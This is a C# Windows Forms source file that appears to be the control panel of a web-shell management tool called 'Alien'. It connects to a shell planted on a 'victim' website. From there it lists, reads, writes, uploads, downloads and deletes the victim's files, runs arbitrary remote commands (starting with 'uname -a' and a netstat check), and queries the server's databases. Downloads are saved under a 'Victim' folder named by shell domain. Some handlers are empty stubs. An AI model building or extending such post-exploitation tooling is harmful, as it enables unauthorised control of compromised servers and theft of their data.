using ICSharpCode.TextEditor;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;

namespace Alien
{
    public partial class frmControlPanel : Form
    {
        private clsWeb m_web { get; set; }
        private clsVictim m_victim { get { return m_web.m_victim; } }

        public clsInfoSpyder m_infoSpyder { get; set; }
        public clsfnFileMgr m_fileMgr { get; set; }
        public clsfnShell m_rShell { get; set; }
        public clsfnDb m_dbMgr { get; set; }

        private WebBrowser m_ctrlInfoBrowser = new WebBrowser();
        private WebBrowser m_ctrlEvalBrowser = new WebBrowser();
        private TextEditorControlEx m_ctrlEvalEditor = new TextEditorControlEx();
        private TextEditorControlEx m_ctrlPostEditor = new TextEditorControlEx();

        private string[] m_asImageExt =
        {
            "png", "jpg", "bmp",
        };
        private bool fnbIsImageFile(string szExtension) => m_asImageExt.Contains(szExtension.Replace(".", string.Empty));

        public frmControlPanel(clsWeb web)
        {
            InitializeComponent();

            m_web = web;

            m_infoSpyder = new clsInfoSpyder(web);
            m_fileMgr = new clsfnFileMgr(web);
            m_rShell = new clsfnShell(web);
            m_dbMgr = new clsfnDb(web, "db.sqlite");
        }

        async Task<bool> fnbValidator()
        {
            if (!await m_web.fnbTestWebConnection())
            {
                MessageBox.Show("Website connection failed.", "fnbTestWebConnection()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }

            if (!await m_web.fnbTestShellConnection())
            {
                MessageBox.Show("Shell connection failed", "fnbTestShellConnection()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }

            return true;
        }

        #region Tool

        private TreeNode fnFindNodeWithFullPath(TreeNodeCollection cNode, string szFullPath) => fnFindNodeWithFullPath(cNode, szFullPath.Replace("\\", "/").Split('/'));
        private TreeNode fnFindNodeWithFullPath(TreeNodeCollection cNode, string[] asName, TreeNode rootNode = null)
        {
            if (asName.Length == 0)
                return rootNode;

            foreach (TreeNode node in cNode)
            {
                if (string.Equals(node.Text, asName[0]))
                {
                    return fnFindNodeWithFullPath(node.Nodes, asName[1..], node);
                }
            }

            return null;
        }
        private clsfnFileMgr.stEntry fnFileGetItemTag(ListViewItem item) => (clsfnFileMgr.stEntry)item.Tag;

        private T? fnFindForm<T>() where T : Form
        {
            foreach (Form f in Application.OpenForms)
            {
                if (typeof(T).Name == f.GetType().Name)
                {
                    return (T)f;
                }
            }

            return null;
        }

        #endregion
        #region Info

        private async Task<string> fnszGetInfo()
        {
            toolStripStatusLabel1.Text = "Loading...";
            string szResp = await m_infoSpyder.fnszGetInfo();
            toolStripStatusLabel1.Text = "Action successfully.";

            return szResp;
        }

        #endregion
        #region FileMgr

        private TreeNode[] fnFileFindNodesWithText(TreeNodeCollection cNode, string szText)
        {
            List<TreeNode> lNode = new List<TreeNode>();
            foreach (TreeNode node in cNode)
            {
                if (node.Text == szText)
                    lNode.Add(node);
            }

            return lNode.ToArray();
        }

        void fnFileAddPathToTreeView(string szDirPath) => fnFileAddPathToTreeView(szDirPath.Replace("\\", "/").Split('/'));
        void fnFileAddPathToTreeView(string[] asDirPath, TreeNode node = null)
        {
            if (asDirPath.Length == 0)
                return;

            string szDir = asDirPath[0];
            TreeNode[] aNode = fnFileFindNodesWithText(node == null ? treeView3.Nodes : node.Nodes, szDir);
            if (aNode.Length == 0)
            {
                TreeNode newNode = new TreeNode(szDir);
                if (node == null)
                    treeView3.Nodes.Add(newNode);
                else
                    node.Nodes.Add(newNode);

                aNode = new TreeNode[] { newNode };
            }

            fnFileAddPathToTreeView(asDirPath[1..], aNode[0]);
        }

        async void fnFileMgrRefresh() => Invoke(new Action(() => fnFileScandir(m_fileMgr.m_szCurrentPath)));

        async void fnFileScandir(string szDir)
        {
            listView2.Items.Clear();
            textBox1.Text = szDir;

            TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, szDir);
            if (node == null)
                node = fnFindNodeWithFullPath(treeView3.Nodes, szDir.Replace("\\", string.Empty));

            var le = await m_fileMgr.fnleScandir(szDir);
            var leFolder = le.Where(x => x.bIsDirectory).ToList();
            var leFile = le.Where(x => !x.bIsDirectory).ToList();

            foreach (var entry in leFolder.Concat(leFile))
            {
                ListViewItem item = new ListViewItem(entry.szEntryName);
                item.SubItems.Add(entry.szPriviledge);
                item.SubItems.Add(entry.nSize.ToString());
                item.SubItems.Add(entry.dtCreationDate.ToString("F"));
                item.SubItems.Add(entry.dtLastModifiedDate.ToString("F"));
                item.SubItems.Add(entry.dtLastAccessedDate.ToString("F"));

                string szExtension = entry.szEntryName.Split('.').Last();
                if (!entry.bIsDirectory)
                    m_fileMgr.fnGetExtensionIcon(szExtension);

                item.ImageKey = entry.bIsDirectory ? "folder" : szExtension;

                item.Tag = entry;

                listView2.Items.Add(item);

                if (node != null && entry.bIsDirectory && fnFindNodeWithFullPath(treeView3.Nodes, entry.szEntryPath) == null)
                {
                    TreeNode newNode = new TreeNode(entry.szEntryName);
                    int nIdx = 0;
                    while (
                        node.Nodes.Count > 0
                        && nIdx < node.Nodes.Count
                        && string.Compare(newNode.Text, node.Nodes[nIdx].Text) > 0
                    )
                    {
                        nIdx++;
                    }

                    node.Nodes.Insert(nIdx, newNode);
                }
            }

            node?.Expand();

            toolStripStatusLabel2.Text = $"Action successfully | Folder[{leFolder.Count}], File[{leFile.Count}]";
        }

        async void fnFileDisplayAllImage()
        {
            List<string> lsImagePath = new List<string>();
            foreach (ListViewItem item in listView2.Items)
            {
                var entry = fnFileGetItemTag(item);
                if (!entry.bIsDirectory && fnbIsImageFile(Path.GetExtension(entry.szEntryPath)))
                    lsImagePath.Add(entry.szEntryPath);
            }

            if (lsImagePath.Count == 0)
            {
                MessageBox.Show("List is empty");
                return;
            }

            await fnFileDisplayImage(lsImagePath);
        }
        async Task fnFileDisplayImage(List<string> lsImagePath)
        {
            if (lsImagePath.Count == 0)
            {
                MessageBox.Show("List is empty", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            frmFileImage? f = fnFindForm<frmFileImage>();
            if (f == null)
            {
                f = new frmFileImage(lsImagePath.Count);
                f.Text = "DisplayImage";

                f.Show();
            }
            else
            {
                f.BringToFront();
                f.Focus();
            }

            foreach (string szFilePath in lsImagePath)
            {
                Image img = await m_fileMgr.fnReadImage(szFilePath);
                if (img == null)
                {
                    MessageBox.Show("Failed to read image: " + szFilePath, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                f.fnAddImage(szFilePath, img);
            }
        }

        async void fnFileRead(string szFilePath)
        {
            frmTextEditor? f = fnFindForm<frmTextEditor>();
            if (f == null)
            {
                f = new frmTextEditor();
                f.Owner = this;
                f.Show();
            }

            f.BringToFront();

            string szContent = await m_fileMgr.fnszRead(szFilePath);
            f.fnShowContent(szFilePath, szContent);
        }

        public async Task<bool> fnbFileWrite(string szFilePath, string szContent)
        {
            if (await m_fileMgr.fnbWrite(szFilePath, szContent))
            {
                toolStripStatusLabel1.Text = "Action successfully.";
                return true;
            }
            else
            {
                MessageBox.Show("Write file failed.", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }

        async void fnFileDirExists(string szDirPath)
        {
            szDirPath = await m_fileMgr.fnszCheckPathExists(szDirPath);
            fnFileAddPathToTreeView(szDirPath);

            TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, szDirPath);
            treeView3.SelectedNode = node;
        }

        public async Task<Dictionary<string, bool>> fnFileUpload(List<string> lsSrcFilePath, int nThread = 3, int nChunkSize = 5 * 1024, Action fnOnCallback = null)
        {
            tabControl6.SelectedIndex = 1;

            string szCurrentDir = m_fileMgr.m_szCurrentPath;
            Dictionary<string, bool> dicState = new Dictionary<string, bool>();
            Dictionary<string, TreeNode> dicNode = new Dictionary<string, TreeNode>();

            TreeNode nodeUpload = treeView4.Nodes[0];

            foreach (string szSrcFilePath in lsSrcFilePath)
            {
                long nFileSize = -1;

                if (nFileSize == -1)
                {
                    FileInfo info = new FileInfo(szSrcFilePath);
                    nFileSize = info.Length;
                }

                string szFileName = Path.GetFileName(szSrcFilePath);
                TreeNode node = new TreeNode($"{szFileName}[0%|0/{nFileSize}]");
                node.Tag = 0;
                nodeUpload.Nodes.Add(node);

                dicNode.Add(szSrcFilePath, node);

                nodeUpload.Expand();
            }

            List<Task> lsTask = new List<Task>();
            using (SemaphoreSlim semaphore = new SemaphoreSlim(nThread))
            {
                foreach (string szSrcFilePath in lsSrcFilePath)
                {
                    long nFileSize = -1;

                    string szFileName = Path.GetFileName(szSrcFilePath);
                    string szDstFilePath = Path.Combine(szCurrentDir, szFileName).Replace("\\", "/");

                    if (nFileSize == -1)
                    {
                        FileInfo info = new FileInfo(szSrcFilePath);
                        nFileSize = info.Length;
                    }

                    long nProgress = 0;

                    TreeNode node = dicNode[szSrcFilePath];
                    node.Tag = nProgress;

                    Action act = () =>
                    {
                        Invoke(new Action(() =>
                        {
                            nProgress = (long)node.Tag;
                            nProgress += nChunkSize;
                            node.Tag = nProgress;

                            string szProgress = (((decimal)nProgress / nFileSize) * 100).ToString("0.00");
                            node.Text = $"{szFileName}[{szProgress}%|{nProgress}/{nFileSize}]";

                            if (nProgress >= nFileSize)
                            {
                                nodeUpload.Nodes.Remove(node);
                            }
                        }));
                    };

                    lsTask.Add(Task.Run(async () =>
                    {
                        await semaphore.WaitAsync();

                        try
                        {
                            bool bRet = await m_fileMgr.fnbFileUpload(szSrcFilePath, szDstFilePath, nChunkSize, act, fnOnCallback);
                            dicState[szFileName] = bRet;

                            Invoke(new Action(() =>
                            {
                                if (dicNode.ContainsKey(szSrcFilePath))
                                    dicNode.Remove(szSrcFilePath);
                            }));
                        }
                        finally
                        {
                            semaphore.Release();
                        }
                    }));

                    await Task.WhenAll(lsTask);
                }
            }

            return dicState;
        }

        public async Task<(Dictionary<string, bool> dicState, string szSaveDirPath)> fnFileDownload(List<string> lsRemoteFilePath, int nThread = 3, int nChunkSize = 5 * 1024, Action fnCallback = null)
        {
            string szLocalSaveDirPath = Path.Combine("Victim", m_victim.m_szShellDomain, "Downloads");
            if (!Directory.Exists(szLocalSaveDirPath))
                Directory.CreateDirectory(szLocalSaveDirPath);

            Dictionary<string, bool> dicState = new Dictionary<string, bool>();

            lsRemoteFilePath = lsRemoteFilePath.Select(x => x.Replace("\\", "/")).ToList();

            long nFileSize = -1;

            foreach (string szRemoteFilePath in lsRemoteFilePath)
            {
                string szFileName = Path.GetFileName(szRemoteFilePath);
                string szLocalFilePath = Path.Combine(szLocalSaveDirPath, szFileName);

                bool bRet = await m_fileMgr.fnbFileDownload(szRemoteFilePath, szLocalFilePath, nChunkSize, null);
                dicState[szRemoteFilePath] = bRet;
            }

            return (dicState, szLocalSaveDirPath);
        }

        public async void fnFileNewFolder()
        {

        }

        public void fnFileNewFile()
        {
            frmTextEditor? f = fnFindForm<frmTextEditor>();
            if (null == f)
            {
                f = new frmTextEditor();
                f.Owner = this;
                f.Show();
            }

            f.BringToFront();

            string szFileName = clsTool.fnszGenerateFileNameWithDateTime("txt");
            string szFilePath = Path.Combine(m_fileMgr.m_szCurrentPath, szFileName).Replace("\\", "/");
            f.fnShowContent(szFilePath, string.Empty);
        }

        public async void fnFileDelete(string szDstEntry)
        {
            bool bRet = await m_fileMgr.fnbDelete(szDstEntry);
            if (bRet)
                fnFileMgrRefresh();
        }
        public void fnFileDelete(clsfnFileMgr.stEntry entry) => fnFileDelete((entry.bIsDirectory ? entry.szEntryPath + "/" : entry.szEntryPath).Replace("\\", "/"));

        #endregion
        #region Shell

        async void fnShellInit()
        {
            textBox3.BackColor = Color.Black;
            textBox3.ForeColor = m_victim.m_bUnixLike ? Color.Cyan : Color.White;

            string szCommand = m_victim.m_bUnixLike ? "uname -a" : "ver";
            await fnShellExecute(szCommand);

            string szInitCommand = $"netstat -ano | {(m_victim.m_bUnixLike ? "grep" : "find")} \"ESTABLISHED\"";
            textBox3.AppendText(szInitCommand);
        }

        async Task fnShellExecute(string szCommand)
        {
            var ret = await m_rShell.fnShellExecute(szCommand);
            string[] asOutput = ret.szOutput.Split('\n');

            textBox3.AppendText(string.Join(Environment.NewLine, asOutput));
            textBox3.AppendText(Environment.NewLine);

            string szPrompt = $"{(m_victim.m_bUnixLike ? $"{ret.szCurrentDir}$" : $"{ret.szCurrentDir}>")}";
            textBox3.AppendText(szPrompt);
            textBox3.Focus();

            textBox3.SelectionStart = textBox3.Text.Length;
            textBox3.SelectionLength = 0;

            textBox3.Tag = textBox3.Text.Length;
        }

        #endregion
        #region Database

        public void fnDbInit()
        {
            //Load database from *.sqlite file.
            treeView2.Nodes.Clear();

            var ls = m_dbMgr.fnGetAllDbConfig();
            foreach (var db in ls)
            {
                TreeNode node = new TreeNode(db.szSource);
                node.Tag = db;

                treeView2.Nodes.Add(node);
            }
        }

        async void fnGetTable()
        {

        }

        async void fnDbReadTable()
        {

        }

        void fnAddNewDbConfig()
        {

        }

        #endregion
        #region Run Code



        #endregion

        async void fnSetup()
        {
            treeView3.ImageList = fileImageList;
            m_fileMgr.m_ExtIcon.Images.Add(fileImageList.Images["folder"]);
            m_fileMgr.m_ExtIcon.Images.SetKeyName(m_fileMgr.m_ExtIcon.Images.Count - 1, "folder");
            listView2.SmallImageList = m_fileMgr.m_ExtIcon;

            tabPage1.Controls.Add(m_ctrlInfoBrowser);
            m_ctrlInfoBrowser.Dock = DockStyle.Fill;
            m_ctrlInfoBrowser.BringToFront();

            splitContainer4.Panel1.Controls.Add(m_ctrlEvalBrowser);
            tabControl5.TabPages[0].Controls.Add(m_ctrlEvalEditor);
            tabControl5.TabPages[1].Controls.Add(m_ctrlPostEditor);
            m_ctrlEvalBrowser.Dock = DockStyle.Fill;
            m_ctrlEvalEditor.Dock = DockStyle.Fill;
            m_ctrlPostEditor.Dock = DockStyle.Fill;
            m_ctrlEvalBrowser.BringToFront();
            m_ctrlEvalEditor.BringToFront();
            m_ctrlPostEditor.BringToFront();

            if (await fnbValidator())
            {
                var fileInit = await m_fileMgr.fnszInit();

                //Information
                m_ctrlInfoBrowser.DocumentText = await fnszGetInfo();

                //FileMgr
                textBox1.Text = fileInit.szCurrentDir;
                m_web.m_victim.m_bUnixLike = fileInit.bUnixLike;
                foreach (string szName in fileInit.lsLogicalDrive)
                {
                    TreeNode node = new TreeNode(szName);
                    node.ImageKey = "harddrive";
                    treeView3.Nodes.Add(node);
                }

                fnFileAddPathToTreeView(fileInit.szCurrentDir);
                treeView3.ExpandAll();

                TreeNode cdNode = fnFindNodeWithFullPath(treeView3.Nodes, fileInit.szCurrentDir);
                treeView3.SelectedNode = cdNode;

                //Shell
                m_rShell.m_szCurrentDir = fileInit.szCurrentDir;
                fnShellInit();

                //Database
                fnDbInit();
            }
            else
            {
                MessageBox.Show("Validation failed", "fnbValidator()", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void frmControlPanel_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void treeView3_AfterSelect(object sender, TreeViewEventArgs e)
        {
            toolStripStatusLabel2.Text = "Loading...";

            TreeNode node = treeView3.SelectedNode;
            node.SelectedImageKey = node.ImageKey;
            string szDir = node.Parent == null && !m_victim.m_bUnixLike ? node.FullPath + "\\" : node.FullPath;
            fnFileScandir(szDir);
        }

        //File.Parent
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, m_fileMgr.m_szCurrentPath);
            if (node != null && node.Parent != null)
                treeView3.SelectedNode = node.Parent;
        }
        //File.Home
        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, m_fileMgr.m_szHomePath);
            if (node != null)
                treeView3.SelectedNode = node;
        }
        //File.Edit
        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView2.SelectedItems)
            {
                var stEntry = fnFileGetItemTag(item);
                if (!stEntry.bIsDirectory)
                    fnFileRead(stEntry.szEntryPath);
            }
        }
        //File.Copy
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {

        }
        //File.Cut
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {

        }
        //File.Paste
        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {

        }
        //File.Image.ShowAll
        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            fnFileDisplayAllImage();
        }
        //File.Image.ShowSelected
        private async void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            List<string> lsFilePath = new List<string>();

            foreach (ListViewItem item in listView2.SelectedItems)
            {
                var entry = fnFileGetItemTag(item);
                if (!entry.bIsDirectory && fnbIsImageFile(Path.GetExtension(entry.szEntryPath)))
                    lsFilePath.Add(entry.szEntryPath);
            }

            await fnFileDisplayImage(lsFilePath);
        }

        private async void toolStripButton3_Click(object sender, EventArgs e)
        {
            m_ctrlInfoBrowser.DocumentText = await fnszGetInfo();
        }

        private void listView2_DoubleClick(object sender, EventArgs e)
        {
            List<ListViewItem> lItem = listView2.SelectedItems.Cast<ListViewItem>().ToList();
            if (lItem.Count == 0)
                return;

            var entry = fnFileGetItemTag(lItem[0]);
            if (entry.bIsDirectory)
            {
                TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, entry.szEntryPath);
                if (node != null)
                    treeView3.SelectedNode = node;
            }
            else
            {
                fnFileRead(entry.szEntryPath);
            }
        }

        private void listView2_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control)
            {
                if (e.KeyCode == Keys.A)
                {
                    listView2.Items.Cast<ListViewItem>().Select(x => x.Selected = true);
                }
            }
            else
            {
                if (e.KeyCode == Keys.F5)
                {
                    fnFileScandir(m_fileMgr.m_szCurrentPath);
                }
                else if (e.KeyCode == Keys.Enter)
                {
                    foreach (ListViewItem item in listView2.SelectedItems)
                    {
                        var entry = fnFileGetItemTag(item);
                        if (entry.bIsDirectory)
                            treeView3.SelectedNode = fnFindNodeWithFullPath(treeView3.Nodes, entry.szEntryPath);
                        else
                            fnFileRead(entry.szEntryPath);
                    }
                }
            }
        }

        private void textBox3_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                int nIdx = (int)textBox3.Tag;
                string szCommand = textBox3.Text.Substring(nIdx);

                fnShellExecute(szCommand);
            }
            else if (e.KeyCode == Keys.Delete || e.KeyCode == Keys.Back)
            {
                int nIdx = (int)textBox3.Tag;
                if (textBox3.SelectionStart <= nIdx)
                {
                    textBox3.SelectionStart = nIdx;
                    e.Handled = true;
                }
            }
        }

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                fnFileDirExists(textBox1.Text);
            }
        }

        private void textBox3_KeyPress(object sender, KeyPressEventArgs e)
        {

        }

        //File.NewFolder
        private void toolStripMenuItem15_Click(object sender, EventArgs e)
        {

        }
        //File.NewFile
        private void toolStripMenuItem16_Click(object sender, EventArgs e)
        {
            fnFileNewFile();
        }

        //File.NewFile
        private void toolStripMenuItem13_Click(object sender, EventArgs e)
        {
            fnFileNewFile();
        }

        private void toolStripMenuItem11_Click(object sender, EventArgs e)
        {

        }

        //File.NewFolder
        private void toolStripMenuItem12_Click(object sender, EventArgs e)
        {

        }

        private void toolStripButton4_Click(object sender, EventArgs e)
        {
            frmDbEdit f = new frmDbEdit(m_dbMgr, this);

            f.ShowDialog();
        }

        private async void treeView2_AfterSelect(object sender, TreeViewEventArgs e)
        {
            TreeNode node = treeView2.SelectedNode;
            if (node.Parent == null)
            {
                //Show tables
                var config = m_dbMgr.m_stDbConfig[node.Text];
                string szTables = await m_dbMgr.fnSqlExec(config, "SHOW TABLES;");
                MessageBox.Show(szTables);
            }
        }

        //Upload
        private void toolStripMenuItem8_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Multiselect = true;

            if (ofd.ShowDialog() == DialogResult.OK)
            {
                List<string> lsSrcFiles = ofd.FileNames.ToList();

                fnFileUpload(lsSrcFiles, 3, 1024 * 10, fnFileMgrRefresh);
            }
        }

        //Download
        private async void toolStripMenuItem9_Click(object sender, EventArgs e)
        {
            List<clsfnFileMgr.stEntry> lsEntry = listView2.SelectedItems.Cast<ListViewItem>().Select(x => fnFileGetItemTag(x)).ToList();
            var lsDir = lsEntry.Where(x => x.bIsDirectory).Select(x => x.szEntryPath).ToList();
            var lsFile = lsEntry.Where(x => !x.bIsDirectory).Select(x => x.szEntryPath).ToList();

            var result = await fnFileDownload(lsFile);
            var dicState = result.dicState;
            var szSaveDirPath = result.szSaveDirPath;

            if (dicState.Values.Any(x => x == true))
            {
                DialogResult dr = MessageBox.Show(
                    "Downloading task is completed, do you want to open the save folder?",
                    "Finished",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Question
                );

                if (dr == DialogResult.Yes)
                {
                    Process.Start("explorer.exe", szSaveDirPath);
                }
            }
            else
            {
                MessageBox.Show("Failed", "Download File", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        //WGET
        private void toolStripMenuItem10_Click(object sender, EventArgs e)
        {

        }

        //Parent
        private void toolStripButton5_Click(object sender, EventArgs e)
        {
            TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, m_fileMgr.m_szCurrentPath);
            if (node == null || node.Parent == null)
                return;

            treeView3.SelectedNode = node.Parent;
        }

        //Home
        private void toolStripButton6_Click(object sender, EventArgs e)
        {
            TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, m_fileMgr.m_szHomePath);
            if (node == null)
                return;

            treeView3.SelectedNode = node;
        }

        //Delete
        private void toolStripMenuItem17_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView2.SelectedItems)
            {
                var entry = fnFileGetItemTag(item);
                fnFileDelete(entry);
            }
        }

        //Find
        private void toolStripButton4_Click_1(object sender, EventArgs e)
        {

        }
    }
}
